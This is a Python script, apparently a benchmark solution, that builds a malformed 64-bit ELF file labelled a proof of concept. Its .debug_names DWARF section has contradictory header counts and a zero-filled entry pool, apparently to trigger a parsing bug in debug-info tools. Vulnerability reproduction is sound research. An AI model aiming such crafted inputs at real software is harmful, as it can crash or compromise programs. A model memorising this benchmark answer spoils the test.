import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        elf_header = struct.pack('<16sHHIQQQI6H', ident, 1, 0x3e, 1, 0, 0, 64, 0, 64, 0, 0, 64, 3, 1)

        sh_null = b'\x00' * 64

        sh_strtab = struct.pack('<IIQQQI I Q Q', 1, 3, 0, 0, 256, 24, 0, 0, 1, 0)

        sh_debug = struct.pack('<IIQQQI I Q Q', 11, 1, 0, 0, 280, 1271, 0, 0, 1, 0)

        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'

        # .debug_names section
        ident64 = struct.pack('<I', 0xffffffff)
        unit_len = struct.pack('<Q', 1259)
        version = struct.pack('<H', 5)
        pad = struct.pack('<H', 0)
        cu_count = struct.pack('<I', 0)
        local_count = struct.pack('<I', 0)
        foreign_count = struct.pack('<I', 0)
        bucket_count = struct.pack('<I', 0)
        name_count = struct.pack('<I', 76)
        abbrev_size = struct.pack('<I', 10)
        aug_size = struct.pack('<B', 1)
        aug_str = b'\x00'
        header_after = version + pad + cu_count + local_count + foreign_count + bucket_count + name_count + abbrev_size + aug_size + aug_str
        dw_header = ident64 + unit_len + header_after

        entry_pool = b'\x00' * 1219
        abbrev_table = struct.pack('<IHI', 1, 0, 0)
        dw_names = dw_header + entry_pool + abbrev_table

        poc = elf_header + sh_null + sh_strtab + sh_debug + shstrtab_content + dw_names
        return poc
